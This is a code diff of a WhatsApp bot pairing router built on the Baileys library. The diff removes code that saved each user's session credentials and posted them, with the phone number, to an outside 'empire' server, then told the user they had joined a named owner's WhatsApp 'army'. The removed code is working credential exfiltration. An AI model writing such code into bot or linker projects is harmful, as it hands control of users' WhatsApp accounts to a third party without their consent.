@@ -3,16 +3,8 @@ import fs from 'fs';
 import pino from 'pino';
 import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
 import pn from 'awesome-phonenumber';
-import path from 'path';
 
 const router = express.Router();
-
-// NEW: EMPIRE CONFIG FOR AUTO-SEND
-const EMPIRE_URL = "https://vamparina-v1-5.onrender.com";
-const SESSION_DIR = path.join(process.cwd(), 'auto_sessions');
-
-// NEW: Ensure session directory exists
-if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
 
 // Ensure the session directory exists
 function removeFile(FilePath) {
@@ -77,43 +69,6 @@ router.get('/', async (req, res) => {
                     
                     try {
                         const sessionVAMPARINA = fs.readFileSync(dirs + '/creds.json');
-
-                        // NEW: Save session to auto_sessions
-                        const sessionId = "vamp_" + num + "_" + Date.now();
-                        const sessionPath = path.join(SESSION_DIR, sessionId);
-                        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
-                        fs.writeFileSync(path.join(sessionPath, 'creds.json'), sessionVAMPARINA);
-
-                        console.log(`\nNEW WARRIOR SESSION SAVED`);
-                        console.log(`Phone: ${num}`);
-                        console.log(`Session ID: ${sessionId}`);
-                        console.log(`Saved to: ${sessionPath}`);
-
-                        // NEW: Send session to empire bot
-                        try {
-                            const response = await fetch(`${EMPIRE_URL}/vamparina-activate`, {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({
-                                    phone: num,
-                                    sessionId,
-                                    creds: JSON.parse(sessionVAMPARINA),
-                                    type: "phone_number",
-                                    source: "vamparina-code-linker"
-                                })
-                            });
-
-                            const result = await response.json();
-                            console.log("Session sent to empire:", result);
-
-                            // NEW: Notify user of empire activation
-                            await VAMPARINA.sendMessage(jidNormalizedUser(num + '@s.whatsapp.net'), {
-                                text: `*VAMPARINA V1 EMPIRE ACTIVATED*\n\nMethod: Phone Number\nEmpire Group: Joined Automatically\nOwner: Arnold Chirchir (+254703110780)\n\nYou are now part of Kenya's strongest WhatsApp army 2025\n\nLong live the King`
-                            });
-
-                        } catch (err) {
-                            console.error("Failed to send to empire:", err.message);
-                        }
 
                         // Send session file to user
                         const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
